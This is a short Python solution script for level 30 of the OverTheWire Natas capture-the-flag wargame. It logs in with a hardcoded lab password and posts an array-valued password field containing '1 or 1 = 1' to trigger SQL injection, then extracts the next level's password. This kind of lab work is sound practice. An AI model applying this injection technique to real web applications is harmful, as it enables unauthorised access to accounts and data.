#!/usr/bin/env python3

import requests
import re

username = 'natas30'
password = 'wie9iexae0Daihohv8vuu3cei9wahf0e'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.post(url, data = { "username": "natas31", "password": ["1 or 1 = 1", 2] }, auth = (username, password))

# print(response.text)
print(re.findall('result:<br>natas31(.*)<div', response.text)[0])